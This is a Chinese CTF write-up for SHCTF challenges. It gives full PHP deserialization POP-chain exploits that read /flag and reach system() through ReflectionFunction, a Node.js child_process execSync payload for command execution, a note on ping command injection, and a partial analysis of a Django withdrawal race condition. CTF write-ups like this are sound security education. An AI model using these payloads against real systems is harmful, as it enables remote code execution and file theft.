---
title: SHCTF第三届山河杯
date: 2026-03-21 10:15:23
tags:
---

## [阶段1] Ezphp

这里还是知识欠缺了，最后读文件用的是php的原生类:(

基本的链子会写，关键就是最后一步原生类的利用

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

class Sun{
    public $sun;
    public function __destruct(){
        die("Maybe you should fly to the ".$this->sun);
    }
}

class Solar{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;
    public function __set($name,$key){
        $this->Mars = $key;
        $Dyson = $this->Mercury;
        $Sphere = $this->Venus;
        $Dyson->$Sphere($this->Mars);
    }
    public function __call($func,$args){
        if(!preg_match("/exec|popen|popens|system|shell_exec|assert|eval|print|printf|array_keys|sleep|pack|array_pop|array_filter|highlight_file|show_source|file_put_contents|call_user_func|passthru|curl_exec/i", $args[0])){
            $exploar = new $func($args[0]);
            $road = $this->Jupiter;
            $exploar->$road($this->Saturn);
        }
        else{
            die("Black hole");
        }
    }
}

class Moon{
    public $nearside;
    public $farside;
    public function __tostring(){
        $starship = $this->nearside;
        $starship();
        return '';
    }
}

class Earth{
    public $onearth;
    public $inearth;
    public $outofearth;
    public function __invoke(){
        $oe = $this->onearth;
        $ie = $this->inearth;
        $ote = $this->outofearth;
        $oe->$ie = $ote;
    }
}



if(isset($_POST['travel'])){
    $a = unserialize($_POST['travel']);
    throw new Exception("How to Travel?");
}
```

exp

```php
<?php
class Sun{
    public $sun;
}

class Solar{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;
}

class Moon{
    public $nearside;
    public $farside;
}

class Earth{
    public $onearth;
    public $inearth;
    public $outofearth;
}

$a = new Sun();
$a -> sun = new Moon();
$a -> sun -> nearside = new Earth();
$a -> sun -> nearside -> onearth = new Solar();
$a -> sun -> nearside -> inearth = "aaa";
$a -> sun -> nearside -> outofearth = "/flag";
$a -> sun -> nearside -> onearth -> Mercury = new Solar();
$a -> sun -> nearside -> onearth -> Venus = "SplFileObject";
$a -> sun -> nearside -> onearth -> Mercury -> Jupiter = "fpassthru";
$a -> sun -> nearside -> onearth -> Mercury -> Saturn = '';


$payload = 'a:2:{i:0;' . serialize($a) . ';i:0;i:0;}';

echo urlencode($payload);
```

如果进一步需要RCE的话，可以利用反射类

```php
<?php
class Sun{
    public $sun;
}

class Solar{
    private $Sun;
    public $Mercury;
    public $Venus;
    public $Earth;
    public $Mars;
    public $Jupiter;
    public $Saturn;
    public $Uranus;
    public $Neptune;
}

class Moon{
    public $nearside;
    public $farside;
}

class Earth{
    public $onearth;
    public $inearth;
    public $outofearth;
}

$a = new Sun();
$a -> sun = new Moon();
$a -> sun -> nearside = new Earth();
$a -> sun -> nearside -> onearth = new Solar();
$a -> sun -> nearside -> inearth = "aaa";
$a -> sun -> nearside -> outofearth = "array_map";
$a -> sun -> nearside -> onearth -> Mercury = new Solar();
$a -> sun -> nearside -> onearth -> Venus = "ReflectionFunction";
$a -> sun -> nearside -> onearth -> Mercury -> Jupiter = "invokeArgs";
$a -> sun -> nearside -> onearth -> Mercury -> Saturn = ['system',['ls /']];


$payload = 'a:2:{i:0;' . serialize($a) . ';i:0;i:0;}';

echo urlencode($payload);
```

#### 参考文献

[磨好的利剑:PHP原生类 | Blog of AyaN0](https://ayan0.top/2025/07/01/磨好的利剑-PHP原生类/#php原生类)

## [阶段1] calc?js?fuck!

拥抱ai

题目进去是计算器，审计源码发现存在命令执行漏洞，用jsfuck就能绕过

![image-20260321105359043](https://gitee.com/bobrocket/img/raw/master/image-20260321105359043.png)

payload

```
process.mainModule.require('child_process').execSync('cat /flag').toString()
```

## [阶段1] ez-ping

命令分割+通配符

![image-20260321110819410](https://gitee.com/bobrocket/img/raw/master/image-20260321110819410.png)

## [阶段1] ez_race

ai一把锁

### 🚨 核心漏洞：竞态条件 (Race Condition)

代码中所有的资金操作（提现 `WithdrawView`、充值 `RechargeView`、买旗 `buy_flag`）都试图通过数据库事务 (`transaction.atomic()`) 和 `F()` 表达式来保证原子性，但在 **检查余额** 和 **扣款** 之间存在逻辑竞争窗口，或者更准确地说，是利用了 **并发请求下的状态不一致**。

#### 漏洞点分析：`WithdrawView` (提现)

```python
1    def form_valid(self, form):
2        amount = form.cleaned_data["amount"]
3        with transaction.atomic():
4            time.sleep(1.0)  # <--- 关键延迟！故意拉大竞争窗口
5            user = models.User.objects.get(pk=self.request.user.pk) # 1. 读取当前用户对象（此时还没应用 F 表达式）
6            
7            # 2. 检查余额 (基于读取时的旧值或当前数据库值，取决于隔离级别，但这里逻辑有问题)
8            # 注意：user.money 此时是直接从数据库取出的整数值，不是 F 对象
9            if user.money >= amount:
10                # 3. 执行扣款 (使用 F 表达式)
11                user.money = F('money') - amount
12                user.save()
13                models.WithdrawLog.objects.create(user=user, amount=amount)
14        
15        # 4. 刷新数据
16        user.refresh_from_db()
17        
18        # 5. 核心判断逻辑漏洞
19        if user.money < 0:
20            return HttpResponse(os.environ.get("FLAG", "flag{flag_test}"))
```

**攻击原理：**
虽然使用了 `F('money') - amount` 进行原子减法，但是 **检查逻辑 `if user.money >= amount` 是在减法之前进行的**。
更重要的是，最后的 `if user.money < 0` 检查是获取最终结果。

在 Django 中，`F()` 表达式的更新是在数据库层面执行的。
如果两个请求同时发起：

1. **请求 A**: 余额 100，提现 100。
2. **请求 B**: 余额 100，提现 100。

**正常逻辑下（无延迟）：**
数据库事务隔离级别通常是 `Read Committed` 或更高。

- 事务 A 开始 -> 读余额 100 -> 检查 100>=100 (True) -> 执行 `UPDATE ... money = money - 100` -> 提交。余额变 0。
- 事务 B 开始 -> 读余额 0 (因为 A 已提交) -> 检查 0>=100 (False) -> 不执行。

**但是，代码中有一个 `time.sleep(1.0)`！**
这极大地拉长了持有锁的时间或者事务执行的时间窗口。

**真正的漏洞逻辑在于 `F()` 的使用方式与检查逻辑的脱节：**
代码先 `get` 出来一个 `user` 对象（此时 `user.money` 是具体的数字，比如 10）。
然后判断 `if user.money >= amount`。
如果并发极高，且数据库隔离级别允许脏读或不可重复读（或者利用 `time.sleep` 让两个事务都卡在 `get` 之后，`save` 之前），可能会出现以下情况：

**场景模拟 (利用 time.sleep 制造并发窗口):**
假设用户余额为 **10**。用户发起 **2个** 并发请求，每个请求提现 **10**。

1. **线程 1**: 进入 `atomic` -> `sleep(1s)` -> `get` 用户 (钱=10) -> 检查 `10 >= 10` (True)。
2. **线程 2**: (几乎同时) 进入 `atomic` -> `sleep(1s)` -> `get` 用户 (钱=10，因为线程1还没提交) -> 检查 `10 >= 10` (True)。
3. **线程 1**: 唤醒 -> 执行 `user.money = F('money') - 10` -> `save()` (数据库执行 `UPDATE table SET money = money - 10 WHERE id=1`)。此时数据库余额变为 **0**。提交事务。
4. **线程 2**: 唤醒 -> 执行 `user.money = F('money') - 10` -> `save()`。
   - 这里取决于数据库的锁机制。如果是行锁，线程2会等待线程1提交。
   - **关键点**：一旦线程1提交，线程2继续执行。线程2的 `F('money')` 是基于**当前数据库值**计算的。
   - 线程1提交后，库中是 0。线程2执行 `0 - 10 = -10`。
   - **结果**：余额变成了 **-10**。
